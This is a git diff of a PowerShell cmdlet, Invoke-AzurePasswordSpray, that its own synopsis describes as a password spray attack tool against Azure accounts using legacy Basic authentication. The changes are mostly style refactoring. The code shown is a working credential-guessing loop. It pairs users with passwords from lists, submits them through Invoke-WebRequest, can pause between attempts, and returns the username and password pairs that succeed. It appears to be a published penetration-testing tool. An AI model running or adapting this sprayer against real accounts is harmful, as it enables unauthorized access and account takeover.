@@ -1,3 +1,4 @@
+Function Invoke-AzurePasswordSpray {
 <#
 .SYNOPSIS
 This cmdlet is used to perform a password spray attack against Azure accounts using legacy "Basic" Authentication
@@ -56,8 +57,10 @@ Contact: rosborne@osbornepro.com
 .LINK
 https://osbornepro.com
 https://writeups.osbornepro.com
+https://encrypit.osbornepro.com
 https://btpssecpack.osbornepro.com
 https://github.com/tobor88
+https://github.com/OsbornePro
 https://gitlab.com/tobor88
 https://www.powershellgallery.com/profiles/tobor
 https://www.linkedin.com/in/roberthosborne/
@@ -73,7 +76,6 @@ System.String, System,Array
 PSCustomObject
 
 #>
-Function Invoke-AzurePasswordSpray {
     [CmdletBinding(DefaultParameterSetName='Username')]
         param (
             [Parameter(
@@ -124,15 +126,13 @@ Function Invoke-AzurePasswordSpray {
                 ValueFromPipeline=$False)]  # End Parameter
             [Switch][Bool]$RoundRobin)  # End param
 
-BEGIN
-{
+BEGIN {
 
     $Obj = @()
     $UserList = @()
     $PasswdList = @()
 
-    Switch ($Authentication)
-    {
+    Switch ($Authentication) {
 
         'Basic' {
 
@@ -153,34 +153,27 @@ BEGIN
             $AuthContext = New-Object -TypeName "Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContext" -ArgumentList https://login.microsoftonline.com/tenantname.onmicrosoft.com/
             $Client_id = "a0c73c16-a7e3-4564-9a95-2bdf47383716"
 
-            If ($RoundRobin.IsPresent)
-            {
+            If ($RoundRobin.IsPresent) {
 
-                ForEach ($P in $PasswdList)
-                {
+                ForEach ($P in $PasswdList) {
 
-                    ForEach ($U in $UserList)
-                    {
+                    ForEach ($U in $UserList) {
 
                         $SecureString = $P | ConvertTo-SecureString -AsPlainText -Force
                         $Cred = New-Object -TypeName System.Management.Automation.PSCredential($U, $SecureString)
 
-                        Try
-                        {
+                        Try {
 
                             Invoke-WebRequest -Uri $Uri -Credential $Cred | Out-Null
                             $Obj += New-Object -TypeName PSCustomObject -Property @{Username=$U; Password=$P}
 
-                        }  # End Try
-                        Catch
-                        {
+                        } Catch {
 
-                            Write-Verbose "$U authentication failed with password $P"
+                            Write-Verbose -Message "$U authentication failed with password $P"
 
-                        }  # End Catch
+                        }  # End Try Catch
 
-                        If ($PSBoundParameters.Keys -like "Sleep*")
-                        {
+                        If ($PSBoundParameters.Keys -like "Sleep*") {
 
                             Start-Sleep -Seconds $SleepSeconds
 
@@ -190,18 +183,13 @@ BEGIN
 
                 }  # End ForEach
 
-            }  # End If
-            Else
-            {
+            } Else {
 
-                ForEach ($U in $UserList)
-                {
+                ForEach ($U in $UserList) {
 
-                    ForEach ($P in $PasswdList)
-                    {
+                    ForEach ($P in $PasswdList) {
 
-                        Try
-                        {
+                        Try {
 
                             $SecureString = $P | ConvertTo-SecureString -AsPlainText -Force
                             $Cred = New-Object -TypeName System.Management.Automation.PSCredential($U, $SecureString)
@@ -214,16 +202,13 @@ BEGIN
 
                             $Obj += New-Object -TypeName PSCustomObject -Property @{Username=$U; Password=$P}
 
-                        }  # End Try
-                        Catch
-                        {
+                        } Catch {
 
-                            Write-Verbose "$U authentication failed with password $P"
+                            Write-Verbose -Message "$U authentication failed with password $P"
 
                         }  # End Catch
 
-                        If ($PSBoundParameters.Keys -like "Sleep*")
-                        {
+                        If ($PSBoundParameters.Keys -like "Sleep*") {
 
                             Start-Sleep -Seconds $SleepSeconds
 
@@ -241,23 +226,21 @@ BEGIN
 
     }  # End Switch
 
-    Switch ($PSBoundParameters.Keys)
-    {
+    Switch ($PSBoundParameters.Keys) {
 
         'Passwd' {
 
-            Write-Verbose "Passwd being used"
+            Write-Verbose -Message "Passwd being used"
             [Array]$PasswdList = $Passwd
 
         }  # End Switch Passwd
 
         'PassFile' {
 
-            Write-Verbose "PassFile being used"
+            Write-Verbose -Message "PassFile being used"
 
             $PassList = Get-Content -Path $PasswdFile
-            ForEach ($P in $PassList)
-            {
+            ForEach ($P in $PassList) {
 
                 $PasswdList += $P
 
@@ -267,29 +250,25 @@ BEGIN
 
     }  # End Password Switch
 
-    Write-Output "[*] Begining password spray"
+    Write-Output -InputObject "[*] Begining password spray"
 
-}  # End BEGIN
-PROCESS
-{
+} PROCESS {
 
-    Switch ($PSCmdlet.ParameterSetName)
-    {
+    Switch ($PSCmdlet.ParameterSetName) {
 
         'Username' {
 
-            Write-Verbose "Username ParameterSet being used"
+            Write-Verbose -Message "Username ParameterSet being used"
             [Array]$UserList = $Username
 
         }  # End Switch Username
 
         'UserFile' {
 
-            Write-Verbose "UserFile ParameterSet being used"
+            Write-Verbose -Message "UserFile ParameterSet being used"
 
             $Users = Get-Content -Path $UsernameFile
-            ForEach ($User in $Users)
-            {
+            ForEach ($User in $Users) {
 
                 $UserList += $User
 
@@ -299,34 +278,27 @@ PROCESS
 
     }  # End Switch
 
-    If ($RoundRobin.IsPresent)
-    {
+    If ($RoundRobin.IsPresent) {
 
-        ForEach ($P in $PasswdList)
-        {
+        ForEach ($P in $PasswdList) {
 
-            ForEach ($U in $UserList)
-            {
+            ForEach ($U in $UserList) {
 
                 $SecureString = $P | ConvertTo-SecureString -AsPlainText -Force
                 $Cred = New-Object -TypeName System.Management.Automation.PSCredential($U, $SecureString)
 
-                Try
-                {
+                Try {
 
                     Invoke-WebRequest -Uri $Uri -Credential $Cred | Out-Null
                     $Obj += New-Object -TypeName PSCustomObject -Property @{Username=$U; Password=$P}
 
-                }  # End Try
-                Catch
-                {
+                } Catch {
 
-                    Write-Verbose "$U authentication failed with password $P"
+                    Write-Verbose -Message "$U authentication failed with password $P"
 
-                }  # End Catch
+                }  # End Try Catch
 
-                If ($PSBoundParameters.Keys -like "Sleep*")
-                {
+                If ($PSBoundParameters.Keys -like "Sleep*") {
 
                     Start-Sleep -Seconds $SleepSeconds
 
@@ -336,35 +308,27 @@ PROCESS
 
         }  # End ForEach
 
-    }  # End If
-    Else
-    {
+    } Else {
 
-        ForEach ($U in $UserList)
-        {
+        ForEach ($U in $UserList) {
 
-            ForEach ($P in $PasswdList)
-            {
+            ForEach ($P in $PasswdList) {
 
                 $SecureString = $P | ConvertTo-SecureString -AsPlainText -Force
                 $Cred = New-Object -TypeName System.Management.Automation.PSCredential($U, $SecureString)
 
-                Try
-                {
+                Try {
 
                     Invoke-WebRequest -Uri $Uri -Credential $Cred | Out-Null
                     $Obj += New-Object -TypeName PSCustomObject -Property @{Username=$U; Password=$P}
 
-                }  # End Try
-                Catch
-                {
+                } Catch {
 
-                    Write-Verbose "$U authentication failed with password $P"
+                    Write-Verbose -Message "$U authentication failed with password $P"
 
-                }  # End Catch
+                }  # End Try Catch
 
-                If ($PSBoundParameters.Keys -like "Sleep*")
-                {
+                If ($PSBoundParameters.Keys -like "Sleep*") {
 
                     Start-Sleep -Seconds $SleepSeconds
 
@@ -376,22 +340,17 @@ PROCESS
 
     }  # End Else
 
-}  # End PROCESS
-END
-{
+} END {
 
-    If ($Obj)
-    {
+    If ($Obj) {
 
-        $Obj
+        Return $Obj
 
-    }  # End If
-    Else
-    {
+    } Else {
 
-        Write-Output "[*] None of the user and password combinations defined were successful"
+        Write-Output -InputObject "[x] None of the user and password combinations defined were successful"
 
-    }  # End Else
+    }  # End If Else
 
 }  # End END
 
